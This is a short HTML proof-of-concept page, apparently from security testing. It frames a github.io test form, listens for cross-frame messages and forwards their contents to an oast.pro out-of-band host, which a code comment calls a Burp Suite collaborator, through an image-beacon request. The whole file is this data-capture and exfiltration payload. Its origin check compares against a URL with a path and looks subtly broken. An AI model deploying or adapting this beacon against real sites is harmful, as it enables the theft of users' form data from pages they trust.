<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Load Form and Capture Response</title>
    <style>
        iframe {
            border: none;
            width: 100%;
            height: 100%;
        }
    </style>
</head>
<body>
    <iframe src="https://drwhitehack.github.io/Test/"></iframe>
    <script>
        // Function to capture response
        function captureResponse(response) {
            // Send the response to the Burp Suite collaborator
            var img = new Image();
            img.src = "http://co4n42didn6kb1bavvhgvsichixfygpwj.oast.pro?response=" + encodeURIComponent(response);
        }

        // Listen for messages from the iframe
        window.addEventListener('message', function(event) {
            if (event.origin === 'https://drwhitehack.github.io/Test/') { // Replace with the origin of your form page
                var response = event.data;
                captureResponse(response);
            }
        });
    </script>
</body>
</html>
